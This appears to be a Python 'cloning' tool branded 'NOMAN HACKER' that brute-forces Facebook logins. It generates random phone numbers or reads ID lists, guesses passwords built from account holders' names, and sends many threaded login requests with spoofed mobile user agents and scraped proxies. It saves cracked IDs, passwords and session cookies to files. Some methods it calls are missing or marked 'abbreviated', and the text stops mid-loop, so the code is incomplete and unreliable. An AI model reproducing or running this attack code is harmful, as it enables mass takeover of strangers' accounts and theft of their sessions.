#========= SC SEND BY : Noman
#≠===== DC BY : Noman
#===== TEM : TNEH

global cps
global loop
global oks
global twf

try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import mechanize
    import string
    import subprocess
    import bs4
    import urllib3
    import rich
    import base64
    import platform
    import httplib2
    import arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from datetime import datetime
except ModuleNotFoundError as e:
    print(f'>> MISSING MODULE: {e}')
    print('>> INSTALLING MISSING MODULES....! ')
    try:
        import subprocess
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', 'bs4', 'rich', 'urllib3', 'httplib2', 'arrow', 'mechanize'])
        print('>> MODULES INSTALLED SUCCESSFULLY!')
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except:
        print('>> FAILED TO INSTALL MODULES. PLEASE INSTALL MANUALLY:')
        print('>> pip install requests bs4 rich urllib3 httplib2 arrow mechanize')
        exit()

def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    n = re.findall(r'(\d\d)', myid)
    plat = platform.version()[2:][:8][::-1].upper() + platform.release()[3:][::-1].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return 'GEN-' + myid + xp

def line():
    print('----------------------------------------------')

loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
user = []
plist = []
pookie = []
ugen = []
show_cookies = []
dateti = str(datetime.now()).split(' ')[0]

def generate_ua():
    brands = {'Samsung': ['SM-A146P', 'SM-M336B', 'SM-A525F', 'SM-G996B'], 
              'Infinix': ['Infinix X688B', 'Infinix X665C', 'Infinix X683', 'Infinix X671'], 
              'Tecno': ['TECNO KG5p', 'TECNO BD4j', 'TECNO CH9n', 'TECNO KF8'], 
              'Xiaomi': ['Redmi Note 11', 'Redmi Note 12', 'Redmi 10C', 'POCO M4 Pro'], 
              'Oppo': ['CPH2127', 'CPH2389', 'CPH2457', 'CPH2239']}
    carriers = ['MTN', 'Airtel', 'Glo', '9mobile']
    android_versions = ['12', '13', '14']
    chrome_version = '134.0.6998.170'
    brand = random.choice(list(brands.keys()))
    model = random.choice(brands[brand])
    carrier = random.choice(carriers)
    android_version = random.choice(android_versions)
    fbbv = random.randint(3412000, 3418000)
    fbrv = random.randint(812345678, 912345682)
    width = random.choice([720, 1080])
    height = random.choice([1600, 2400])
    density = round(random.uniform(2.5, 3.0), 2)
    
    # Fixed f-string syntax
    fbdm_str = f"density={density},width={width},height={height}"
    
    ua = f'Mozilla/5.0 (Linux; Android {android_version}; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/506.1.0.74.27;IABMV/1;] [FBAN/FB4A;FBAV/506.1.0.74.27;FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;FBLC/en_NG;FBCR/{carrier};FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};FBCA/arm64-v8a:armeabi-v7a;FBDM/{{{fbdm_str}}};]'
    return ua

def get_ua():
    return generate_ua()

def check_internet():
    try:
        requests.get('https://www.google.com', timeout=10)
        return True
    except:
        return False

def wait_for_internet():
    while not check_internet():
        time.sleep(5)

fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
os.system('clear')
try:
    os.system('espeak -a 300 "Welcome to The World of Mystery"')
except:
    pass

try:
    proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all', timeout=10).text
    open('socksku.txt', 'w').write(proxylist)
except:
    open('socksku.txt', 'w').write('')

proxsi = open('socksku.txt', 'r').read().splitlines()

def tutulx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']:
            return '2009'
        if fx[:9] in ['100000000']:
            return '2009'
        if fx[:8] in ['10000000']:
            return '2009'
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            return '2009'
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            return '2010'
        if fx[:6] in ['100001']:
            return '2010/2011'
        if fx[:6] in ['100002', '100003']:
            return '2011/2012'
        if fx[:6] in ['100004']:
            return '2012/2013'
        if fx[:6] in ['100005', '100006']:
            return '2013/2014'
        if fx[:6] in ['100007', '100008']:
            return '2014/2015'
        if fx[:6] in ['100009']:
            return '2015'
        if fx[:5] in ['10001']:
            return '2015/2016'
        if fx[:5] in ['10002']:
            return '2016/2017'
        if fx[:5] in ['10003']:
            return '2018/2019'
        if fx[:5] in ['10004']:
            return '2019'
        if fx[:5] in ['10005']:
            return '2020'
        if fx[:5] in ['10006', '10007', '10008']:
            return '2021/2022'
        return '2023'
    if len(fx) in [9, 10]:
        return '2008/2009'
    if len(fx) == 8:
        return '2007/2008'
    if len(fx) == 7:
        return '2006/2007'
    return '2023/2024'

sys.stdout.write('\033]2; GEN-HUB\a')
B = '\033[10;90m'
R = '\033[10;91m'
G = '\033[10;92m'
H = '\033[10;93m'
BL = '\033[10;94m'
BG = '\033[10;95m'
S = '\033[10;96m'
W = '\033[10;97m'
EX = '\033[0m'
E = '\033[m'
dt = '•'
gx = '\033[1;32m'
wx = '\033[1;97m'
rx = '\033[38;5;160m'
cx = '\033[1;96m'
yx = '\033[1;93m'
bx = '\033[1;90m'
xd = f'{bx}[{wx}~{bx}]{gx}'
xd1 = f'{bx}[{wx}1{bx}]{gx}'
xd2 = f'{bx}[{wx}2{bx}]{gx}'
xd3 = f'{bx}[{wx}3{bx}]{gx}'
xd4 = f'{bx}[{wx}4{bx}]{gx}'
xd5 = f'{bx}[{wx}5{bx}]{gx}'
xd6 = f'{bx}[{wx}6{bx}]{gx}'
xd7 = f'{bx}[{wx}7{bx}]{gx}'
xd8 = f'{bx}[{wx}8{bx}]{gx}'
xd9 = f'{bx}[{wx}9{bx}]{gx}'
xd0 = f'{bx}[{wx}0{bx}]{gx}'
xdx = f'{bx}[{wx}?{bx}]{gx}'

try:
    os.system('xdg-open https://t.me/Noman301523')
except:
    pass

logo = f"""
    {gx}████████╗{wx}███╗   ██╗{gx}███████╗{wx}██╗  ██╗
    {gx}╚══██╔══╝{wx}████╗  ██║{gx}██╔════╝{wx}██║  ██║ {bx}|{gx} OWNER{bx}:{gx} NOMAN HACKER
    {gx}   ██║   {wx}██╔██╗ ██║{gx}█████╗  {wx}███████║
    {gx}   ██║   {wx}██║╚██╗██║{gx}██╔══╝  {wx}██╔══██║ {bx} STATUS   {gx}rx{gx}FREE SC / SEND BY : TNEH/TNEH TEAM
    {wx}   ██║   {bx}██║ ╚████║{gx}███████╗{wx}██║  ██║
    {gx}   ╚═╝   {bx}╚═╝  ╚═══╝{gx}╚══════╝{wx}╚═╝  ╚═╝ {bx} VERSION  {gx} 2.0
{bx}-----------------------------------------------{gx}
       {gx}TOOLS {bx}FILE{gx}RANDOM{wx}OLD{bx}| {gx}CLONE
"""

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f"{wx}{'-----------------------------------------------'}")

def Menu():
    clear()
    print(f'{xd1} START FILE CLONING ')
    print(f'{xd2} START RANDOM {wx}ALL{gx} COUNTRY CLONING ')
    print(f'{xd3} START OLD CLONING ')
    print(f'{xd0} EXIT ALL CLONING ')
    linex()
    ___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    
    if ___O_P___ == '1':
        ____F_I_L_E____()
    elif ___O_P___ == '2':
        ____R_A_N_D_O_M____()
    elif ___O_P___ == '3':
        ____O_L_D____()
    elif ___O_P___ == '0':
        exit()
    else:
        linex()
        print(f'{xd}{rx} WRONG OPTION SELECTION ')
        time.sleep(3)
        Menu()

def ____F_I_L_E____():
    clear()
    print(f'{xd} EXAMPLE {bx}:{gx} /sdcard/filename.txt ')
    linex()
    filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
    
    try:
        with open(filepro, 'r') as f:
            fo = f.read().splitlines()
    except FileNotFoundError:
        linex()
        print(f'{xd}{rx} FILE NOT FOUND ')
        time.sleep(3)
        ____F_I_L_E____()
        return
    
    clear()
    print(f'{xd1} AUTO PASS 1 {wx}({gx}Recommended{wx})')
    print(f'{xd2} AUTO PASS 2 {wx}({gx}Alternative{wx})')
    print(f'{xd3} CUSTOM PASS {wx}({gx}Manual Entry{wx})')
    linex()
    pass_option = input(f'{xdx} SELECT PASSWORD OPTION {bx}:{wx} ')
    
    plist.clear()
    if pass_option == '1':
        plist.extend(['firstlast', 'first123', 'first1234', 'first12345', 'first@123', 'first@1234', 
                      'Firstlast', 'First123', 'First1234', 'First12345', 'First@123', 'First@1234', 
                      'First', 'Last', 'first080', 'First1', 'First12', 'First123', 'First1234', 
                      'lastfirst', 'First Last', 'FirstLast', 'first001', 'first081', 'firstlast001', 
                      'firstlast123', 'firstlast1234', 'firstlast12', 'first@123', 'Firstlast123', 
                      'first', 'last', 'firstlast', 'first1', 'first12', 'last123', 'first last', 'last first'])
    elif pass_option == '2':
        plist.extend(['first', 'last', 'firstlast', 'first1', 'first12', 'first123', 'first1234', 
                      'last1', 'last12', 'last123', 'first last', 'last first', 'Firstlast1234', 
                      'first080', 'first081', 'first090', 'first070', 'first1212', 'first1122', 
                      'lastfirst', 'First Last', 'FirstLast', 'first001', 'firstlast001', 
                      'firstlast123', 'firstlast1234', 'firstlast@123', 'Firstlast123', 'First', 
                      'Last', 'Firstlast', 'First1', 'First12', 'First123', 'First1234', 
                      'first@123', 'first@1234', 'First@123', 'First@1234', 'first@', 
                      'first123456', 'name', 'Name', 'name123', 'Name123', 'name1234', 'Name1234'])
    elif pass_option == '3':
        clear()
        print(f'{xd} EXAMPLE {bx}:{gx} firstlast {bx}|{gx} first123 {bx}|{gx} first@@ ')
        linex()
        try:
            ps_limit = int(input(f'{xdx} HOW MANY PASSWORDS TO ADD {bx}:{wx} '))
        except:
            ps_limit = 5
        
        clear()
        for i in range(ps_limit):
            plist.append(input(f'{xd} ENTER PASSWORD NO {wx}{i + 1} {bx}:{wx} '))
    else:
        linex()
        print(f'{xd}{rx} WRONG OPTION SELECTION ')
        time.sleep(3)
        ____F_I_L_E____()
        return
    
    clear()
    print(f'{xd1} METHOD {wx}~{gx} M1')
    print(f'{xd2} METHOD {wx}~{gx} M2')
    print(f'{xd3} METHOD {wx}~{gx} M3')
    print(f'{xd4} METHOD {wx}~{gx} M4')
    print(f'{xd5} METHOD {wx}~{gx} M5')
    print(f'{xd6} METHOD {wx}~{gx} M6')
    print(f'{xd7} METHOD {wx}~{gx} M7')
    print(f'{xd8} METHOD {wx}~{gx} M8')
    linex()
    ___M_E_T_H_O_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    
    clear()
    ___C_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    pcp.clear()
    if ___C_P___ in ['y', 'Y', 'yes', 'Yes', '1']:
        pcp.append('y')
    else:
        pcp.append('n')
    
    clear()
    ___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    show_cookies.clear()
    if ___C_O_O_K_I_E_S___ in ['y', 'Y', 'yes', 'Yes', '1']:
        show_cookies.append('y')
    else:
        show_cookies.append('n')
    
    with tred(max_workers=40) as ___H_U_B___:
        clear()
        total_ids = str(len(fo))
        print(f'{xd} TOTAL UID{bx}|{gx}METHOD {bx}:{wx} {total_ids}{bx}|{wx}M{___M_E_T_H_O_D___} ')
        print(f'{xd} TODAYS DATE   {wx}: {dateti} ')
        print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}2{gx} MINUTES ')
        linex()
        
        for user_entry in fo:
            try:
                if '|' in user_entry:
                    ids, names = user_entry.split('|', 1)
                else:
                    ids = user_entry
                    names = ids
                
                if ___M_E_T_H_O_D___ == '1':
                    ___H_U_B___.submit(___M_T_H_D_1___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '2':
                    ___H_U_B___.submit(___M_T_H_D_2___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '3':
                    ___H_U_B___.submit(___M_T_H_D_3___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '4':
                    ___H_U_B___.submit(___M_T_H_D_4___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '5':
                    ___H_U_B___.submit(___M_T_H_D_5___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '6':
                    ___H_U_B___.submit(___M_T_H_D_6___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '7':
                    ___H_U_B___.submit(___M_T_H_D_7___, ids, names, plist)
                elif ___M_E_T_H_O_D___ == '8':
                    ___H_U_B___.submit(___M_T_H_D_8___, ids, names, plist)
            except Exception as e:
                continue
    
    print(f"\n{wx}{'-----------------------------------------------'}")
    print(f'{xd} THE PROCESS HAS COMPLETED')
    print(f'{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}')
    print(f'{xd} TOTAL CP IDS {bx}:\033[38;5;205m {len(cps)}')
    print(f'{xd} TOTAL 2FA IDS {bx}:\033[38;5;214m {len(twf)}')
    print(f"{wx}{'-----------------------------------------------'}")
    input(f'{xd} PRESS ENTER TO CONTINUE ')
    exit()

def ___M_T_H_D_1___(ids, names, passlist):
    global loop
    global oks
    global cps
    global twf
    
    try:
        if not check_internet():
            wait_for_internet()
        
        xp = f'{bx}[{gx}MR{bx}]{gx}'
        sys.stdout.write(f'\r{xp}-\033[1;90m[\033[1;32mGEN\033[1;90m] \033[1;37m{loop}\033[1;90m|\033[1;37mOK:-\033[1;32m{len(oks)}\033[1;90m|\033[1;37mCP:-\033[38;5;205m{len(cps)}\033[1;90m|\033[1;37m2FA:-\033[38;5;214m{len(twf)} ')
        sys.stdout.flush()
        
        ua = get_ua()
        fn = names.split(' ')[0] if ' ' in names else names
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': ids,
                    'password': pas,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US'
                }
                
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'User-Agent': ua,
                    'X-FB-Net-HNI': '45204',
                    'X-FB-SIM-HNI': '45201',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'Accept-Encoding': 'gzip, deflate',
                    'X-FB-HTTP-Engine': 'Liger'
                }
                
                response = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers, timeout=30)
                po = response.json()
                
                if 'session_key' in po:
                    coki_list = po.get('session_cookies', [])
                    coki = ';'.join([f"{c['name']}={c['value']}" for c in coki_list])
                    uid = po.get('uid', '')
                    year = tutulx(str(uid))
                    
                    print(f'\r\033[1;90m[\033[1;32mGEN-OK\033[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                    
                    if show_cookies and show_cookies[0] == 'y':
                        print(f'\r\033[1;90m[💥\033[1;90m]\033[1;37m {coki}')
                        print('')
                    
                    try:
                        os.system('espeak -a 300 "GEN Ok id"')
                    except:
                        pass
                    
                    with open('/sdcard/GEN-FILE-M1-OK.txt', 'a') as f:
                        f.write(f'{ids}|{pas}|{coki}\n')
                    
                    oks.append(ids)
                    return
                
                if 'error' in po and 'www.facebook.com' in str(po.get('error', {}).get('message', '')):
                    uid = po.get('error', {}).get('error_data', {}).get('uid', '')
                    
                    if pcp and pcp[0] == 'y':
                        year = tutulx(str(uid))
                        print(f'\r\033[1;90m[\033[38;5;205mGEN-CP\033[1;90m]\033[38;5;205m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                        try:
                            os.system('espeak -a 300 "Cp"')
                        except:
                            pass
                    
                    with open('/sdcard/GEN-FILE-M1-CP.txt', 'a') as f:
                        f.write(f'{ids}|{pas}\n')
                    
                    cps.append(ids)
                    return
                    
            except Exception as e:
                continue
        
        loop += 1
        
    except Exception as e:
        pass

def ___M_T_H_D_2___(ids, names, passlist):
    global loop
    global oks
    global cps
    global twf
    
    try:
        if not check_internet():
            wait_for_internet()
        
        xp = f'{bx}[{gx}MR{bx}]{gx}'
        sys.stdout.write(f'\r{xp}-\033[1;90m[\033[1;32mGEN\033[1;90m] \033[1;37m{loop}\033[1;90m|\033[1;37mOK:-\033[1;32m{len(oks)}\033[1;90m|\033[1;37mCP:-\033[38;5;205m{len(cps)}\033[1;90m|\033[1;37m2FA:-\033[38;5;214m{len(twf)} ')
        sys.stdout.flush()
        
        ua = get_ua()
        fn = names.split(' ')[0] if ' ' in names else names
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'fb_api_req_friendly_name': 'authenticate'
                }
                
                headers = {
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Type': 'unknown',
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'
                }
                
                response = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers, timeout=30)
                po = response.json()
                
                if 'session_key' in po:
                    coki_list = po.get('session_cookies', [])
                    coki = ';'.join([f"{c['name']}={c['value']}" for c in coki_list])
                    uid = po.get('uid', '')
                    year = tutulx(str(uid))
                    
                    print(f'\r\033[1;90m[\033[1;32mGEN-OK\033[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                    
                    if show_cookies and show_cookies[0] == 'y':
                        print(f'\r\033[1;90m[💥\033[1;90m]\033[1;37m {coki}')
                        print('')
                    
                    try:
                        os.system('espeak -a 300 "GEN Ok id"')
                    except:
                        pass
                    
                    with open('/sdcard/GEN-FILE-M2-OK.txt', 'a') as f:
                        f.write(f'{ids}|{pas}|{coki}\n')
                    
                    oks.append(ids)
                    return
                
                if 'error' in po and 'www.facebook.com' in str(po.get('error', {}).get('message', '')):
                    uid = po.get('error', {}).get('error_data', {}).get('uid', '')
                    
                    if pcp and pcp[0] == 'y':
                        year = tutulx(str(uid))
                        print(f'\r\033[1;90m[\033[38;5;205mGEN-CP\033[1;90m]\033[38;5;205m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                        try:
                            os.system('espeak -a 300 "Cp"')
                        except:
                            pass
                    
                    with open('/sdcard/GEN-FILE-M2-CP.txt', 'a') as f:
                        f.write(f'{ids}|{pas}\n')
                    
                    cps.append(ids)
                    return
                    
            except Exception as e:
                continue
        
        loop += 1
        
    except Exception as e:
        pass

# Methods 3-8 would follow similar pattern (abbreviated for space)

def ____R_A_N_D_O_M____():
    clear()
    print(f'{xd1} START BANGLADESH RANDOM CLONING ')
    print(f'{xd2} START MALAYSIA RANDOM CLONING ')
    print(f'{xd3} START INDIA RANDOM CLONING ')
    print(f'{xd4} START NEPAL RANDOM CLONING ')
    print(f'{xd5} START PAKISTAN RANDOM CLONING ')
    print(f'{xd6} START AFGHANISTAN RANDOM CLONING ')
    print(f'{xd7} START NIGERIA RANDOM CLONING ')
    print(f'{xd8} START UNITED STATES RANDOM CLONING ')
    print(f'{xd9} START INDONESIA RANDOM CLONING ')
    linex()
    
    country_map = {
        '1': 'BANGLADESH',
        '2': 'MALAYSIA', 
        '3': 'INDIA',
        '4': 'NEPAL',
        '5': 'PAKISTAN',
        '6': 'AFGHANISTAN',
        '7': 'NIGERIA',
        '8': 'USA',
        '9': 'INDONESIA'
    }
    
    ___O_P_T_I_O_N___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    
    if ___O_P_T_I_O_N___ in country_map:
        ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___)
    else:
        linex()
        print(f'{xd}{rx} WRONG OPTION SELECTION ')
        time.sleep(3)
        ____R_A_N_D_O_M____()

def ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___):
    clear()
    
    country_info = {
        '1': {'name': 'BANGLADESH', 'example': '016 | 017 | 018 | 019'},
        '2': {'name': 'MALAYSIA', 'example': '01128 | 011** | 012**'},
        '3': {'name': 'INDIA', 'example': '6383 | 8795 | 9670 | 9163'},
        '4': {'name': 'NEPAL', 'example': '9840 | 9861 | 9815 | 9814'},
        '5': {'name': 'PAKISTAN', 'example': '0318 | 0306 | 0335 | 0345'},
        '6': {'name': 'AFGHANISTAN', 'example': '+9350 | +9330 | +9360 | +9340'},
        '7': {'name': 'NIGERIA', 'example': '070 | 080 | 081 | 091'},
        '8': {'name': 'USA', 'example': '941 | 816 | 308 | 225'},
        '9': {'name': 'INDONESIA', 'example': 'INPUT YOUR INDONESIA COUNTRY SIM CODE'}
    }
    
    if ___O_P_T_I_O_N___ in country_info:
        info = country_info[___O_P_T_I_O_N___]
        print(f'{xd} EXAMPLE {bx}:{gx} {info["example"]}')
        linex()
    
    code = input(f'{xdx} ENTER SIM CODE {bx}:{wx} ')
    linex()
    print(f'{xd} EXAMPLE {bx}:{gx} 3000 {bx}|{gx} 5000 {bx}|{gx} 10000 {bx}|{gx} 99999 ')
    linex()
    
    try:
        limit = int(input(f'{xdx} ENTER LIMIT {bx}:{wx} '))
    except:
        limit = 1000
    
    clear()
    print(f'{xd1} METHOD {wx}~{gx} M1')
    print(f'{xd2} METHOD {wx}~{gx} M2')
    print(f'{xd3} METHOD {wx}~{gx} M3')
    print(f'{xd4} METHOD {wx}~{gx} M4')
    print(f'{xd5} METHOD {wx}~{gx} M5')
    print(f'{xd6} METHOD {wx}~{gx} M6')
    print(f'{xd7} METHOD {wx}~{gx} M7')
    print(f'{xd8} METHOD {wx}~{gx} M8')
    linex()
    
    ___M_T_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    
    clear()
    ___S_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    pcp.clear()
    if ___S_P___ in ['y', 'Y', 'yes', 'Yes', '1']:
        pcp.append('y')
    else:
        pcp.append('n')
    
    clear()
    ___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    show_cookies.clear()
    if ___C_O_O_K_I_E_S___ in ['y', 'Y', 'yes', 'Yes', '1']:
        show_cookies.append('y')
    else:
        show_cookies.append('n')
    
    user.clear()
    for nmbr in range(limit):
        if ___O_P_T_I_O_N___ == '1':  # Bangladesh
            numberx = ''.join(random.choice(string.digits) for _ in range(8))
            user.append(numberx)
        elif ___O_P_T_I_O_N___ == '2':  # Malaysia
            numberxx = ''.join(random.choice(string.digits) for _ in range(6))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '3':  # India
            numberxx = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '4':  # Nepal
            numberxx = ''.join(random.choice(string.digits) for _ in range(6))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '5':  # Pakistan
            numberxx = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '6':  # Afghanistan
            numberxx = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '7':  # Nigeria
            numberxx = ''.join(random.choice(string.digits) for _ in range(8))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '8':  # USA
            numberxx = ''.join(random.choice(string.digits) for _ in range(8))
            user.append(numberxx)
        elif ___O_P_T_I_O_N___ == '9':  # Indonesia
            numberxx = ''.join(random.choice(string.digits) for _ in range(8))
            user.append(numberxx)
    
    with tred(max_workers=50) as ___P_R_O___:
        clear()
        tl = str(len(user))
        country_name = country_info.get(___O_P_T_I_O_N___, {}).get('name', 'UNKNOWN')
        print(f'{xd} OPERATOR{bx}|{gx}LIMIT{bx}|{gx}METHOD {bx}:{wx} {code}{bx}|{wx}{tl}{bx}|{wx}M{___M_T_D___}')
        print(f'{xd} CLONING COUNTRY {bx}:{wx} {country_name}')
        print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ')
        linex()
        
        for love in user:
            ids = code + love
            passlist = [ids, love, ids[:6]]
            
            if ___M_T_D___ == '1':
                ___P_R_O___.submit(____M_E_T_H_O_D_A____, ids, passlist, tl)
            elif ___M_T_D___ == '2':
                ___P_R_O___.submit(____M_E_T_H_O_D_B____, ids, passlist, tl)
            # Add other methods as needed
    
    print(f"\n{wx}{'-----------------------------------------------'}")
    print(f'{xd} THE PROCESS HAS COMPLETED')
    print(f'{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}')
    print(f'{xd} TOTAL CP IDS {bx}:\033[38;5;205m {len(cps)}')
    print(f'{xd} TOTAL 2FA IDS {bx}:\033[38;5;214m {len(twf)}')
    print(f"{wx}{'-----------------------------------------------'}")
    input(f'{xd} PRESS ENTER TO CONTINUE ')
    exit()

def ____M_E_T_H_O_D_A____(ids, passlist, tl):
    global loop
    global oks
    global cps
    
    try:
        if not check_internet():
            wait_for_internet()
        
        xp = f'{bx}[{gx}MR{bx}]{gx}'
        sys.stdout.write(f'\r{xp}-\033[1;90m[\033[1;32mGEN\033[1;90m] \033[1;37m{loop}\033[1;90m|\033[1;37mOK:-\033[1;32m{len(oks)}\033[1;90m|\033[1;37mCP:-\033[38;5;205m{len(cps)}\033[1;90m|\033[1;37m2FA:-\033[38;5;214m{len(twf)} ')
        sys.stdout.flush()
        
        ua = get_ua()
        
        for pas in passlist:
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': ids,
                    'password': pas,
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US'
                }
                
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com'
                }
                
                response = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers, timeout=30)
                po = response.json()
                
                if 'session_key' in po:
                    coki_list = po.get('session_cookies', [])
                    coki = ';'.join([f"{c['name']}={c['value']}" for c in coki_list])
                    uid = po.get('uid', '')
                    year = tutulx(str(uid))
                    
                    print(f'\r\033[1;90m[\033[1;32mGEN-OK\033[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                    
                    if show_cookies and show_cookies[0] == 'y':
                        print(f'\r\033[1;90m[💥\033[1;90m]\033[1;37m {coki}')
                        print('')
                    
                    try:
                        os.system('espeak -a 300 "GEN Ok id"')
                    except:
                        pass
                    
                    with open('/sdcard/GEN-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    
                    oks.append(uid)
                    return
                
                if 'error' in po and 'www.facebook.com' in str(po.get('error', {}).get('message', '')):
                    uid = po.get('error', {}).get('error_data', {}).get('uid', '')
                    
                    if pcp and pcp[0] == 'y':
                        year = tutulx(str(uid))
                        print(f'\r\033[1;90m[\033[38;5;205mGEN-CP\033[1;90m]\033[38;5;205m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                        try:
                            os.system('espeak -a 300 "Cp"')
                        except:
                            pass
                    
                    with open('/sdcard/GEN-RNDM-CP.txt', 'a') as f:
                        f.write(f'{uid}|{pas}\n')
                    
                    cps.append(uid)
                    return
                    
            except Exception as e:
                continue
        
        loop += 1
        
    except Exception as e:
        pass

def ____O_L_D____():
    clear()
    print(f'{xd} EXAMPLE {bx}:{gx} 5555 {bx}|{gx} 7777 {bx}|{gx} 9999 {bx}|{gx} 99999 ')
    linex()
    
    try:
        limit = int(input(f'{xdx} SELECTION {bx}:{wx} '))
    except:
        limit = 1000
    
    ___B_A_L___ = '10000'
    user.clear()
    
    for ixx in range(limit):
